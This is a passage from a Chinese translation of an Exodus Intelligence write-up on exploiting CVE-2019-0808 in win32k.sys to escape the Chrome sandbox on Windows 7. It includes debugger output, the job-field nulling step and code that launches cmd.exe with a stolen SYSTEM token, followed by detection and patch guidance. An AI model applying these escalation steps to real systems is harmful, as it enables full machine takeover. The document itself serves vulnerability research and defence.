    QuotaPoolUsage[NonPagedPool] 10960
    Working Set Sizes (now,min,max) (9112, 50, 345) (36448KB, 200KB, 1380KB)
    PeakWorkingSetSize 9730
    VirtualSize 733 Mb
    PeakVirtualSize 740 Mb
    PageFaultCount 12913
    MemoryPriority BACKGROUND
    BasePriority 4
    CommitCharge 5355
    
        THREAD 859801e8  Cid 0c54.08e8  Teb: 7ffdf000 Win32Thread: fe118dc8 WAIT: (UserRequest) UserMode Non-Alertable
            859c6dc8  SynchronizationEvent

再次检查Process
Explorer，我们可以确认，由于Chrome渲染的进程令牌中的“作业”字段已为NULL，因此不再有与Chrome渲染器进程关联的任何作业。我们可以在下面的屏幕截图中看到，Chrome渲染器进程无法再使用“作业”选项卡，因为不再有任何作业与之关联，也就意味着它现在可以生成任何想要的子进程。

![](https://p0.ssl.qhimg.com/t013d94bbc790033417.png)

###  生成新进程

一旦Shellcode()执行完成，WindowHookProc()将进行检查，以查看变量success是否设置为TRUE，该变量表明漏洞利用已经成功完成。如果已经成功完成，那么它将在返回执行到main()之前打印成功的消息。

`if (success == TRUE) {  
printf("[*] Successfully exploited the program and triggered the
shellcode!rn");  
}  
else {  
printf("[!] Didn't exploit the program. For some reason our privileges were
not appropriate.rn");  
ExitProcess(-1);  
}`  
main()将退出其窗口消息处理循环，因为后续没有更多的消息需要处理。随后，会执行检查，确认是否成功（设置为TRUE）。如果是，则将执行堆WinExec()的调用，以使用被盗的SYSTEM令牌执行具有SYSTEM权限的cmd.exe。  
`// Execute command if exploit success.  
if (success == TRUE) {  
WinExec("cmd.exe", 1);  
}`

## 威胁检测

我们可以通过测试用户模式下的应用程序行为来检测漏洞利用活动，并判断目标程序是否调用了CreateWindow()或是否使用了IpClassName参数“#32768”来调用CreateWindowEx()。任何用户模式下的合法应用程序都不会轻易使用类字符串“#32768”，因为它主要是操作系统在使用的，因此当我们检测到相关行为时，可以判定为漏洞利用活动。

## 缓解方案

运行Windows
8或更高版本操作系统可以防止攻击者利用该漏洞，因为新版本操作系统可以防止应用程序映射内存地址中前64KB的内容。这也就意味着，攻击者将无法分配NULL页面，或靠近NULL页面的内存地址，例如0x30。除此之外，将操作系统更新至Windows
或更高版本，还可以允许Chrome沙盒屏蔽所有针对win32k.sys的所有调用，这样就可以防止攻击者通过调用NtUserMNDragOver()来触发该漏洞了。

在Windows
7上，唯一的威胁缓解方案就是安装更新补丁KB4489878或KB4489885，大家可以从漏洞CVE-2019-0808的安全公告页面中下载并安装更新补丁。

## 总结

开发一种Chrome沙盒逃逸技术，需要满足很多的条件。但是，通过利用Windows
7等操作系统本身的安全缺陷，比如说win32k.sys中的漏洞，攻击者仍然可以实现Chrome沙盒逃逸，并构建0 day漏洞利用链。

本文翻译自blog.exodusintel.com
[原文链接](http://blog.exodusintel.com/2019/05/17/windows-within-windows/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **WisFree** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/179536](/post/id/179536)

安全客 - 有思想的安全新媒体

本文转载自: [blog.exodusintel.com](http://blog.exodusintel.com/2019/05/17/windows-within-windows/)

如若转载,请注明出处： <http://blog.exodusintel.com/2019/05/17/windows-within-windows/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Chrome](/tag/Chrome)
  * [系统安全](/tag/系统安全)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhimg.com/t014c3fa13dce6c85dd.png) WisFree

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

